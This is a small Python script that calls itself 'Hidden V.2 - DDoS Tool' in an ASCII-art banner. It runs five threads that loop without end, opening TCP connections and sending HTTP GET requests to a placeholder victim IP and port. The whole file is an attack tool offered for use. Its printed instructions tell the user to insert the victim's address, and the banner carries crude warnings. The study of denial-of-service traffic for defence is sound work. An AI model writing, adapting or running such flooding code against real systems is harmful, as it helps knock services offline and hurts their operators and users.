import socket
import threading

attack_num = 0

def attack():
    global attack_num
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('Victim ip', 8000))
        s.send(b'GET / HTTP/1.1\r\nHost:Victim ip\r\n\r\n')
        resp = s.recv(4096)

        global attack_num 
        attack_num += 1
        print('attack number:', attack_num)
        s.close()


def usage():
	print ('Usage: api.py ')
	print ('Example: api.py')
	print ("\a")
print (
"""

                                ,-.
                               ( O_)
                              / `-/
                             /-. /
                            /   )
                           /   /  
              _           /-. /
             (_)*-._     /   )
               *-._ *-'**( )/    
                   *-/*-._* `. 
                    /     *-.'._
                   /\       /-._*-._
    _,---...__    /  ) _,-*/    *-(_)
___<__(|) _   **-/  / /   /
 '  `----' **-.   \/ /   /
               )  ] /   /
       ____..-'   //   /                       )
   ,-**      __.,'/   /   ___                 /,
  /    ,--**/  / /   /,-**   ***-.          ,'/
 [    (    /  / /   /  ,.---,_   `._   _,-','
  \    `-./  / /   /  /       `-._  *** ,-'
   `-._  /  / /   /_,'            **--*
       */  / /   /*         
       /  / /   /
      /  / /   /  
     /  |,'   /  
    :   /    /
    [  /   ,'     ~>Hidden V.2 - DDoS Tool<~
    | /  ,'    
    |/,-'
    '

    If it gives error and saying there not connecting its either the false ip or just a mask over it or a vpn 
    P.S Don't fuck up. OH AND ADD UR VICTIMS IP IN THE LIKE CODE ELSE IT WONT DO SHIT ALSO IN THE 8000 AREA ADD THE PORT AND THE Host: just add the ip to                                            
""")


for i in range(5):
    thread = threading.Thread(target=attack)
    thread.start()